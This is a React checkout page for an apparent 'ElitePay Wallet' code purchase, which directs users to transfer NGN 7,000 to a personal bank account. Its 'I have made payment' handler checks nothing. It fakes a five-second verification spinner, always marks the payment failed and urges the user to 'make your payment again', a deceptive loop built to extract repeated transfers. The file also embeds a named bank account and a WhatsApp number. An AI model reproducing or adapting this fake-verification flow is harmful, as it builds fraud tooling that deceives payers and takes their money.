import { useEffect, useRef, useState } from 'react';
import { useRouter } from 'next/router';
import Layout from '../components/Layout';
import { saveTx } from '../utils/storage';

const CODE_PRICE = 7000;
const DISPLAY_PRICE = 7000;

const ACCOUNT_NUMBER = '6511699109';
const ACCOUNT_NAME = 'Abdulrahim Usman';
const BANK_NAME = 'NOMBA FINANCIAL
SERVICES LIMITED';

// Keep the WhatsApp number in international format without +, spaces or hidden characters.
const WA_NUMBER = '2348068991240';

function CopyIcon({ size = 16 }) {
  return (
    <svg
      width={size}
      height={size}
      viewBox="0 0 24 24"
      fill="none"
      aria-hidden="true"
    >
      <rect
        x="8"
        y="8"
        width="11"
        height="11"
        rx="2"
        stroke="currentColor"
        strokeWidth="2"
      />
      <path
        d="M5 15H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v1"
        stroke="currentColor"
        strokeWidth="2"
        strokeLinecap="round"
      />
    </svg>
  );
}

function CheckIcon({ size = 18 }) {
  return (
    <svg width={size} height={size} viewBox="0 0 24 24" fill="none">
      <path
        d="M5 12.5 9.5 17 19 7.5"
        stroke="currentColor"
        strokeWidth="2.5"
        strokeLinecap="round"
        strokeLinejoin="round"
      />
    </svg>
  );
}

function AlertIcon({ size = 22 }) {
  return (
    <svg width={size} height={size} viewBox="0 0 24 24" fill="none">
      <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="2" />
      <path
        d="M12 7v6"
        stroke="currentColor"
        strokeWidth="2"
        strokeLinecap="round"
      />
      <circle cx="12" cy="16.5" r="1" fill="currentColor" />
    </svg>
  );
}

function MoniepointMark() {
  return (
    <div className="moniepoint-mark" aria-hidden="true">
      <svg
        width="42"
        height="42"
        viewBox="0 0 100 100"
        fill="none"
        xmlns="http://www.w3.org/2000/svg"
      >
        <circle cx="50" cy="50" r="50" fill="#0866C6" />
        <text
          x="50"
          y="60"
          textAnchor="middle"
          fontFamily="Arial, sans-serif"
          fontSize="65"
          fontWeight="bold"
          fill="white"
        >
          M
        </text>
      </svg>
    </div>
  );
}

function Spinner() {
  return <span className="spinner" aria-hidden="true" />;
}

export default function Checkout() {
  const router = useRouter();
  const { name: qName, phone: qPhone } = router.query;

  const [name, setName] = useState('');
  const [phone, setPhone] = useState('');

  const [countdown, setCountdown] = useState(10 * 60);

  const [copied, setCopied] = useState('');

  // Payment checking states
  const [checkingPayment, setCheckingPayment] = useState(false);
  const [paymentFailed, setPaymentFailed] = useState(false);

  // Vendor modal states
  const [vendorModal, setVendorModal] = useState(false);
  const [receipt, setReceipt] = useState(null);
  const [vendorSubmitting, setVendorSubmitting] = useState(false);

  const timerRef = useRef(null);
  const verificationTimerRef = useRef(null);

  useEffect(() => {
    if (typeof qName === 'string') setName(qName);
    if (typeof qPhone === 'string') setPhone(qPhone);
  }, [qName, qPhone]);

  // Checkout countdown
  useEffect(() => {
    timerRef.current = setInterval(() => {
      setCountdown((current) => {
        if (current <= 1) {
          clearInterval(timerRef.current);
          return 0;
        }

        return current - 1;
      });
    }, 1000);

    return () => {
      clearInterval(timerRef.current);
      clearTimeout(verificationTimerRef.current);
    };
  }, []);

  const copyText = async (label, value) => {
    try {
      await navigator.clipboard.writeText(value);
      setCopied(label);

      setTimeout(() => {
        setCopied('');
      }, 1300);
    } catch (error) {
      window.prompt(`Copy ${label}:`, value);
    }
  };

  const buildWhatsAppUrl = (customMessage = '') => {
    const defaultMessage =
      `Hello, I need assistance with my ElitePay transaction.\n\n` +
      `Name: ${name || 'Not provided'}\n` +
      `Phone: ${phone || 'Not provided'}\n` +
      `Amount: NGN ${CODE_PRICE.toLocaleString()}\n` +
      `Account: ${ACCOUNT_NUMBER}\n` +
      `Bank: ${BANK_NAME}`;

    const finalMessage = customMessage || defaultMessage;

    return `https://wa.me/${WA_NUMBER}?text=${encodeURIComponent(finalMessage)}`;
  };

  const openWhatsApp = (message = '') => {
    window.location.href = buildWhatsAppUrl(message);
  };

  // =========================================================
  // I HAVE MADE PAYMENT
  // =========================================================
  const confirmPayment = () => {
    if (countdown === 0) {
      alert('Payment time expired. Please restart checkout.');
      return;
    }

    if (checkingPayment) return;

    setCheckingPayment(true);

    // Keep loading animation for exactly 5 seconds.
    verificationTimerRef.current = setTimeout(() => {
      setCheckingPayment(false);

      // Save the transaction as failed/pending verification.
      saveTx({
        type: 'buy_code',
        amount: CODE_PRICE,
        status: 'failed',
        meta: {
          name,
          phone,
          bank: BANK_NAME,
          account: ACCOUNT_NUMBER,
          reason: 'Payment verification unsuccessful',
        },
        created_at: new Date().toISOString(),
      });

      setPaymentFailed(true);
    }, 5000);
  };

  // =========================================================
  // FAILED PAYMENT POPUP
  // =========================================================
  const closeFailedPopupAndRefresh = () => {
    setPaymentFailed(false);

    // Refresh automatically after popup disappears.
    setTimeout(() => {
      window.location.reload();
    }, 150);
  };

  // =========================================================
  // RECEIPT SELECTOR
  // =========================================================
  const handleReceiptChange = (event) => {
    const selectedFile = event.target.files?.[0];

    if (!selectedFile) {
      setReceipt(null);
      return;
    }

    // Maximum 10MB
    if (selectedFile.size > 10 * 1024 * 1024) {
      alert('Receipt is too large. Please select a file below 10MB.');
      event.target.value = '';
      setReceipt(null);
      return;
    }

    setReceipt(selectedFile);
  };

  // =========================================================
  // CONTACT VENDOR
  // =========================================================
  const contactVendor = () => {
    if (!name.trim()) {
      alert('Please provide your name first.');
      return;
    }

    if (!phone.trim()) {
      alert('Please provide your phone number first.');
      return;
    }

    if (!receipt) {
      alert('Please attach your payment receipt before contacting the vendor.');
      return;
    }

    setVendorSubmitting(true);

    const receiptName = receipt.name;

    const message =
      `Hello Vendor, I need help with my ElitePay transaction.\n\n` +
      `CUSTOMER DETAILS\n` +
      `Name: ${name.trim()}\n` +
      `Phone: ${phone.trim()}\n\n` +
      `PAYMENT DETAILS\n` +
      `Amount: NGN ${CODE_PRICE.toLocaleString()}\n` +
      `Bank: ${BANK_NAME}\n` +
      `Account Number: ${ACCOUNT_NUMBER}\n` +
      `Account Name: ${ACCOUNT_NAME}\n\n` +
      `RECEIPT\n` +
      `Receipt file: ${receiptName}\n\n` +
      `I have attached my payment receipt in this WhatsApp chat for verification.`;

    setTimeout(() => {
      setVendorSubmitting(false);

      // Opens a chat directly with the configured vendor number.
      window.location.href = buildWhatsAppUrl(message);
    }, 500);
  };

  const minutes = String(Math.floor(countdown / 60)).padStart(2, '0');
  const seconds = String(countdown % 60).padStart(2, '0');

  const progressPercentage = Math.max(
    0,
    Math.min(100, (countdown / (10 * 60)) * 100)
  );

  return (
    <Layout title="Checkout - ElitePay Wallet">
      <style>{`
        .checkout-shell {
          min-height: calc(100vh - 170px);
          display: flex;
          justify-content: center;
          padding: 20px 12px 35px;
          background:
            radial-gradient(circle at top, rgba(37, 99, 235, 0.05), transparent 35%),
            #f8fafc;
        }

        .pay-screen {
          width: min(440px, 100%);
          background: #ffffff;
          border: 1px solid #e5eaf0;
          border-radius: 18px;
          padding: 18px;
          box-shadow: 0 22px 70px rgba(15, 23, 42, 0.12);
        }

        .checkout-logo {
          width: 78px;
          height: 78px;
          object-fit: contain;
          display: block;
          margin: 0 auto 10px;
        }

        .checkout-badge {
          width: fit-content;
          margin: 0 auto 14px;
          padding: 6px 10px;
          border-radius: 999px;
          background: #eff6ff;
          border: 1px solid #dbeafe;
          color: #2563eb;
          font-size: 11px;
          font-weight: 900;
          letter-spacing: 0.04em;
        }

        .bank-illustration {
          display: flex;
          justify-content: center;
          margin-bottom: 8px;
        }

        .pay-title {
          text-align: center;
          color: #0f172a;
          font-size: 24px;
          font-weight: 950;
          margin: 0;
          letter-spacing: -0.03em;
        }

        .pay-subtitle {
          text-align: center;
          color: #64748b;
          font-size: 13px;
          margin: 6px 0 0;
        }

        .copy-row {
          text-align: center;
          margin-top: 8px;
        }

        .copy-amount {
          display: inline-flex;
          align-items: center;
          gap: 6px;
          border: 0;
          background: transparent;
          color: #64748b;
          cursor: pointer;
          font-size: 12px;
          font-weight: 800;
        }

        .instruction {
          background: linear-gradient(135deg, #fff7ed, #ffedd5);
          color: #7c2d12;
          border: 1px solid #fed7aa;
          border-radius: 12px;
          padding: 13px 14px;
          font-size: 13px;
          line-height: 1.5;
          text-align: center;
          margin: 16px 0;
        }

        .instruction strong {
          color: #c2410c;
          font-size: 14px;
        }

        .account-card {
          overflow: hidden;
          background: #ffffff;
          border-radius: 14px;
          border: 1px solid #e2e8f0;
          box-shadow: 0 14px 35px rgba(15, 23, 42, 0.08);
        }

        .account-main {
          padding: 22px 18px 20px;
          text-align: center;
        }

        .bank-row {
          display: inline-flex;
          align-items: center;
          gap: 10px;
          margin-bottom: 15px;
        }

        .moniepoint-mark {
          width: 42px;
          height: 42px;
          border-radius: 11px;
          overflow: hidden;
          flex-shrink: 0;
          box-shadow: 0 7px 18px rgba(0, 0, 0, 0.1);
        }

        .moniepoint-mark svg {
          width: 100%;
          height: 100%;
          display: block;
        }

        .bank-name {
          color: #0f172a;
          font-size: 15px;
          font-weight: 900;
          margin: 0;
        }

        .bank-label {
          display: block;
          color: #94a3b8;
          font-size: 10px;
          font-weight: 900;
          text-transform: uppercase;
          letter-spacing: 0.08em;
          margin-bottom: 4px;
        }

        .account-number-wrap {
          background: #f8fbff;
          border: 1px solid #dbeafe;
          border-radius: 12px;
          padding: 13px 10px;
        }

        .account-number-label {
          color: #64748b;
          font-size: 10px;
          font-weight: 900;
          text-transform: uppercase;
          letter-spacing: 0.08em;
          margin-bottom: 5px;
        }

        .account-number {
          display: inline-flex;
          align-items: center;
          justify-content: center;
          gap: 9px;
          color: #1677f2;
          font-size: 27px;
          font-weight: 950;
          border: 0;
          background: transparent;
          cursor: pointer;
          padding: 0;
          letter-spacing: 0.02em;
          line-height: 1.15;
        }

        .account-name {
          margin: 10px 0 0;
          color: #1e3a5f;
          font-size: 16px;
          font-weight: 850;
        }

        .warning-footer {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 8px;
          background: #f8fafc;
          border-top: 1px solid #edf2f7;
          color: #64748b;
          padding: 11px 10px;
          font-size: 11px;
          font-weight: 800;
          text-align: center;
        }

        .minus {
          width: 18px;
          height: 18px;
          border-radius: 50%;
          display: inline-grid;
          place-items: center;
          color: #ffffff;
          background: #ef4444;
          font-weight: 900;
          line-height: 1;
          flex-shrink: 0;
        }

        .copied {
          min-height: 20px;
          color: #059669;
          text-align: center;
          font-size: 12px;
          font-weight: 850;
          margin-top: 8px;
        }

        .progress-section {
          margin-top: 14px;
        }

        .progress-label {
          display: flex;
          justify-content: space-between;
          align-items: center;
          color: #64748b;
          font-size: 11px;
          font-weight: 800;
          margin-bottom: 7px;
        }

        .progress-wrap {
          width: 100%;
          height: 7px;
          border-radius: 999px;
          background: #e2e8f0;
          overflow: hidden;
        }

        .progress-bar {
          height: 100%;
          border-radius: inherit;
          background: #1677f2;
          transition: width 0.4s ease;
        }

        .timer {
          text-align: center;
          color: ${countdown <= 60 ? '#ef4444' : '#475569'};
          font-size: 12px;
          font-weight: 900;
          margin-top: 10px;
        }

        .confirm-note {
          text-align: center;
          color: #94a3b8;
          font-size: 11px;
          line-height: 1.45;
          margin: 5px 0 14px;
        }

        .confirm-button,
        .vendor-main-button {
          width: 100%;
          border: 0;
          border-radius: 12px;
          padding: 14px 16px;
          cursor: pointer;
          font-size: 14px;
          font-weight: 950;
          transition: transform 0.15s ease, box-shadow 0.15s ease, opacity 0.15s ease;
        }

        .confirm-button {
          background: linear-gradient(135deg, #2563eb, #1d4ed8);
          color: #ffffff;
          box-shadow: 0 14px 28px rgba(37, 99, 235, 0.24);
        }

        .vendor-main-button {
          margin-top: 10px;
          background: #ecfdf5;
          color: #047857;
          border: 1px solid #a7f3d0;
        }

        .confirm-button:hover,
        .vendor-main-button:hover {
          transform: translateY(-1px);
        }

        .confirm-button:disabled,
        .vendor-main-button:disabled {
          opacity: 0.65;
          cursor: not-allowed;
          transform: none;
        }

        .button-content {
          display: inline-flex;
          align-items: center;
          justify-content: center;
          gap: 9px;
        }

        .spinner {
          width: 17px;
          height: 17px;
          border: 2px solid rgba(255, 255, 255, 0.35);
          border-top-color: #ffffff;
          border-radius: 50%;
          animation: spin 0.8s linear infinite;
        }

        .modal-overlay {
          position: fixed;
          inset: 0;
          z-index: 9999;
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 18px;
          background: rgba(15, 23, 42, 0.64);
          backdrop-filter: blur(7px);
        }

        .modal {
          width: min(430px, 100%);
          max-height: 92vh;
          overflow-y: auto;
          background: #ffffff;
          border-radius: 18px;
          border: 1px solid #e2e8f0;
          box-shadow: 0 30px 80px rgba(15, 23, 42, 0.28);
          padding: 20px;
          animation: modalIn 0.18s ease-out;
        }

        .failed-modal {
          text-align: center;
        }

        .modal-icon {
          width: 58px;
          height: 58px;
          margin: 0 auto 12px;
          border-radius: 50%;
          display: grid;
          place-items: center;
          background: #fef2f2;
          color: #dc2626;
          border: 1px solid #fecaca;
        }

        .success-icon {
          background: #ecfdf5;
          color: #059669;
          border-color: #a7f3d0;
        }

        .modal-title {
          margin: 0;
          color: #0f172a;
          font-size: 21px;
          font-weight: 950;
        }

        .modal-text {
          margin: 8px 0 16px;
          color: #64748b;
          font-size: 13px;
          line-height: 1.55;
        }

        .failed-message {
          background: #fef2f2;
          border: 1px solid #fecaca;
          border-radius: 12px;
          padding: 12px;
          color: #991b1b;
          font-size: 13px;
          font-weight: 750;
          line-height: 1.5;
          margin-bottom: 15px;
        }

        .modal-close-button {
          width: 100%;
          border: 0;
          border-radius: 12px;
          background: #dc2626;
          color: #ffffff;
          padding: 13px 16px;
          font-size: 14px;
          font-weight: 950;
          cursor: pointer;
        }

        .vendor-header {
          display: flex;
          justify-content: space-between;
          gap: 10px;
          align-items: flex-start;
        }

        .modal-x {
          width: 34px;
          height: 34px;
          border-radius: 50%;
          border: 1px solid #e2e8f0;
          background: #f8fafc;
          color: #475569;
          cursor: pointer;
          font-size: 18px;
          display: grid;
          place-items: center;
          flex-shrink: 0;
        }

        .details-card {
          background: #f8fafc;
          border: 1px solid #e2e8f0;
          border-radius: 12px;
          padding: 12px;
          margin: 12px 0;
        }

        .details-title {
          color: #0f172a;
          font-size: 12px;
          font-weight: 950;
          margin-bottom: 9px;
        }

        .detail-row {
          display: flex;
          justify-content: space-between;
          gap: 14px;
          padding: 7px 0;
          border-bottom: 1px dashed #e2e8f0;
          font-size: 12px;
        }

        .detail-row:last-child {
          border-bottom: 0;
          padding-bottom: 0;
        }

        .detail-row:first-of-type {
          padding-top: 0;
        }

        .detail-label {
          color: #64748b;
          font-weight: 700;
        }

        .detail-value {
          color: #0f172a;
          font-weight: 900;
          text-align: right;
          word-break: break-word;
        }

        .field-label {
          display: block;
          color: #334155;
          font-size: 12px;
          font-weight: 900;
          margin-bottom: 7px;
        }

        .text-input {
          width: 100%;
          box-sizing: border-box;
          border: 1px solid #cbd5e1;
          background: #ffffff;
          color: #0f172a;
          border-radius: 10px;
          padding: 11px 12px;
          font-size: 13px;
          outline: none;
          margin-bottom: 12px;
        }

        .text-input:focus {
          border-color: #2563eb;
          box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
        }

        .receipt-box {
          border: 1.5px dashed #93c5fd;
          background: #eff6ff;
          border-radius: 12px;
          padding: 14px;
          margin-top: 5px;
        }

        .receipt-box-title {
          color: #1e40af;
          font-size: 12px;
          font-weight: 950;
          margin-bottom: 5px;
        }

        .receipt-box-text {
          color: #64748b;
          font-size: 11px;
          line-height: 1.45;
          margin-bottom: 10px;
        }

        .receipt-input {
          width: 100%;
          font-size: 12px;
        }

        .receipt-file {
          margin-top: 8px;
          padding: 8px 10px;
          border-radius: 8px;
          background: #ffffff;
          color: #334155;
          font-size: 11px;
          font-weight: 800;
          word-break: break-word;
        }

        .vendor-submit {
          width: 100%;
          margin-top: 14px;
          border: 0;
          border-radius: 12px;
          background: linear-gradient(135deg, #16a34a, #15803d);
          color: #ffffff;
          padding: 14px 16px;
          font-size: 14px;
          font-weight: 950;
          cursor: pointer;
          box-shadow: 0 14px 28px rgba(22, 163, 74, 0.2);
        }

        .vendor-submit:disabled {
          opacity: 0.6;
          cursor: not-allowed;
        }

        .whatsapp-note {
          margin-top: 10px;
          color: #94a3b8;
          font-size: 10px;
          line-height: 1.5;
          text-align: center;
        }

        .footer-actions {
          display: grid;
          grid-template-columns: 1fr 1px 1fr;
          align-items: center;
          border-top: 1px solid #edf2f7;
          padding-top: 13px;
          margin-top: 16px;
        }

        .divider {
          width: 1px;
          height: 22px;
          background: #dbe3ed;
        }

        .text-action {
          border: 0;
          background: transparent;
          cursor: pointer;
          font-size: 14px;
          font-weight: 900;
          padding: 8px;
        }

        .cancel {
          color: #ef4444;
        }

        .help {
          color: #111827;
        }

        .small-muted {
          color: #94a3b8;
          font-size: 11px;
        }

        @keyframes spin {
          to {
            transform: rotate(360deg);
          }
        }

        @keyframes modalIn {
          from {
            opacity: 0;
            transform: scale(0.96) translateY(6px);
          }
          to {
            opacity: 1;
            transform: scale(1) translateY(0);
          }
        }

        @media (max-width: 480px) {
          .checkout-shell {
            padding: 10px 8px 25px;
          }

          .pay-screen {
            border-radius: 14px;
            padding: 15px;
          }

          .account-number {
            font-size: 24px;
          }
        }
      `}</style>

      <div className="checkout-shell">
        <section className="pay-screen" aria-label="Bank transfer checkout">
          <img
            className="checkout-logo"
            src="/elitepay-logo.png"
            alt="ElitePay"
          />

          <div className="checkout-badge">SECURE BANK TRANSFER</div>

          <div className="bank-illustration">
            <svg
              width="84"
              height="64"
              viewBox="0 0 84 64"
              fill="none"
              aria-hidden="true"
            >
              <path d="M42 4 14 18v6h56v-6L42 4Z" fill="#cbd5e1" />
              <path
                d="M20 28h8v22h-8V28Zm18 0h8v22h-8V28Zm18 0h8v22h-8V28Z"
                fill="#94a3b8"
              />
              <path d="M14 52h56v7H14v-7Z" fill="#cbd5e1" />
              <circle cx="24" cy="49" r="10" fill="#d9e2ec" stroke="#94a3b8" strokeWidth="2" />
              <circle cx="60" cy="49" r="10" fill="#d9e2ec" stroke="#94a3b8" strokeWidth="2" />
            </svg>
          </div>

          <h1 className="pay-title">
            Pay NGN {DISPLAY_PRICE.toLocaleString()}
          </h1>

          <p className="pay-subtitle">
            Transfer the exact amount to the account below
          </p>

          <div className="copy-row">
            <button
              className="copy-amount"
              onClick={() =>
                copyText('amount', String(DISPLAY_PRICE))
              }
              type="button"
            >
              <CopyIcon />
              Copy amount
            </button>
          </div>

          <div className="instruction">
            Transfer exactly{' '}
            <strong>NGN {CODE_PRICE.toLocaleString()}</strong> to the bank
            account below.
          </div>

          <div className="account-card">
            <div className="account-main">
              <div className="bank-row">
                <MoniepointMark />

                <div style={{ textAlign: 'left' }}>
                  <span className="bank-label">Bank name</span>
                  <div className="bank-name">{BANK_NAME}</div>
                </div>
              </div>

              <div className="account-number-wrap">
                <div className="account-number-label">
                  Account number
                </div>

                <button
                  className="account-number"
                  onClick={() =>
                    copyText('account number', ACCOUNT_NUMBER)
                  }
                  type="button"
                >
                  {ACCOUNT_NUMBER}
                  <CopyIcon size={18} />
                </button>
              </div>

              <div className="account-name">{ACCOUNT_NAME}</div>
            </div>

            <div className="warning-footer">
              <span className="minus">-</span>
              <span>Do not save or reuse this account number.</span>
            </div>
          </div>

          <div className="copied">
            {copied ? `${copied} copied` : ''}
          </div>

          <div className="progress-section">
            <div className="progress-label">
              <span>Payment window</span>
              <span>
                {minutes}:{seconds}
              </span>
            </div>

            <div className="progress-wrap">
              <div
                className="progress-bar"
                style={{ width: `${progressPercentage}%` }}
              />
            </div>

            <div className="timer">
              {countdown > 0
                ? `Payment window: ${minutes}:${seconds}`
                : 'Payment window expired'}
            </div>
          </div>

          <div className="confirm-note">
            After transferring, click “I have made payment” to check your
            transaction.
          </div>

          <button
            className="confirm-button"
            onClick={confirmPayment}
            disabled={checkingPayment || countdown === 0}
            type="button"
          >
            {checkingPayment ? (
              <span className="button-content">
                <Spinner />
                Verifying payment...
              </span>
            ) : (
              'I have made payment'
            )}
          </button>

          <button
            className="vendor-main-button"
            onClick={() => setVendorModal(true)}
            type="button"
          >
            Contact Vendor
          </button>

          <div className="footer-actions">
            <button
              className="text-action cancel"
              onClick={() => router.push('/buy-code')}
              type="button"
            >
              Cancel
            </button>

            <span className="divider" />

            <button
              className="text-action help"
              onClick={() => {
                const helpMessage =
                  `Hello, I need help with my ElitePay payment.\n\n` +
                  `Name: ${name || 'Not provided'}\n` +
                  `Phone: ${phone || 'Not provided'}\n` +
                  `Amount: NGN ${CODE_PRICE.toLocaleString()}`;

                window.location.href = buildWhatsAppUrl(helpMessage);
              }}
              type="button"
            >
              Help?
            </button>
          </div>
        </section>
      </div>

      {/* =====================================================
          PAYMENT VERIFICATION LOADING MODAL
      ====================================================== */}
      {checkingPayment && (
        <div className="modal-overlay">
          <div className="modal failed-modal">
            <div
              className="modal-icon"
              style={{
                background: '#eff6ff',
                borderColor: '#bfdbfe',
                color: '#2563eb',
              }}
            >
              <Spinner />
            </div>

            <h2 className="modal-title">Checking Payment</h2>

            <p className="modal-text">
              We are checking your transaction. Please do not close or
              refresh this page.
            </p>

            <div
              style={{
                color: '#64748b',
                fontSize: '12px',
                fontWeight: 800,
              }}
            >
              Verifying transaction...
            </div>
          </div>
        </div>
      )}

      {/* =====================================================
          PAYMENT FAILED MODAL
      ====================================================== */}
      {paymentFailed && (
        <div className="modal-overlay">
          <div className="modal failed-modal">
            <div className="modal-icon">
              <AlertIcon size={25} />
            </div>

            <h2 className="modal-title">Payment Unsuccessful</h2>

            <p className="modal-text">
              We could not confirm your payment at this time.
            </p>

            <div className="failed-message">
              Your transaction was unsuccessful. Please click the button
              below to make your payment again.
            </div>

            <button
              className="modal-close-button"
              onClick={closeFailedPopupAndRefresh}
              type="button"
            >
              Click here to make your payment again
            </button>
          </div>
        </div>
      )}

      {/* =====================================================
          CONTACT VENDOR MODAL
      ====================================================== */}
      {vendorModal && (
        <div
          className="modal-overlay"
          onMouseDown={(event) => {
            if (event.target === event.currentTarget) {
              setVendorModal(false);
            }
          }}
        >
          <div className="modal">
            <div className="vendor-header">
              <div>
                <h2 className="modal-title">Contact Vendor</h2>
                <p className="modal-text">
                  Confirm your details and attach your payment receipt before
                  contacting the vendor.
                </p>
              </div>

              <button
                className="modal-x"
                onClick={() => setVendorModal(false)}
                type="button"
                aria-label="Close"
              >
                ×
              </button>
            </div>

            <div className="details-card">
              <div className="details-title">YOUR DETAILS</div>

              <div className="detail-row">
                <span className="detail-label">Name</span>
                <span className="detail-value">
                  {name || 'Not provided'}
                </span>
              </div>

              <div className="detail-row">
                <span className="detail-label">Phone</span>
                <span className="detail-value">
                  {phone || 'Not provided'}
                </span>
              </div>

              <div className="detail-row">
                <span className="detail-label">Amount</span>
                <span className="detail-value">
                  NGN {CODE_PRICE.toLocaleString()}
                </span>
              </div>

              <div className="detail-row">
                <span className="detail-label">Bank</span>
                <span className="detail-value">{BANK_NAME}</span>
              </div>

              <div className="detail-row">
                <span className="detail-label">Account</span>
                <span className="detail-value">{ACCOUNT_NUMBER}</span>
              </div>
            </div>

            <label className="field-label" htmlFor="vendor-name">
              Confirm your name
            </label>

            <input
              id="vendor-name"
              className="text-input"
              type="text"
              value={name}
              onChange={(e) => setName(e.target.value)}
              placeholder="Enter your name"
            />

            <label className="field-label" htmlFor="vendor-phone">
              Confirm your phone number
            </label>

            <input
              id="vendor-phone"
              className="text-input"
              type="tel"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              placeholder="Enter your phone number"
            />

            <div className="receipt-box">
              <div className="receipt-box-title">
                Attach payment receipt
              </div>

              <div className="receipt-box-text">
                Select your payment screenshot or receipt. You will be asked
                to attach the same receipt inside WhatsApp before sending.
              </div>

              <input
                className="receipt-input"
                type="file"
                accept="image/*,.pdf"
                onChange={handleReceiptChange}
              />

              {receipt && (
                <div className="receipt-file">
                  Attached: {receipt.name}
                </div>
              )}
            </div>

            <button
              className="vendor-submit"
              onClick={contactVendor}
              disabled={vendorSubmitting || !receipt}
              type="button"
            >
              {vendorSubmitting ? (
                <span className="button-content">
                  <Spinner />
                  Opening WhatsApp...
                </span>
              ) : (
                'Confirm & Contact Vendor'
              )}
            </button>

            <div className="whatsapp-note">
              Your name, phone number, payment amount and transaction details
              will be pre-filled in the WhatsApp chat.
            </div>
          </div>
        </div>
      )}
    </Layout>
  );
}
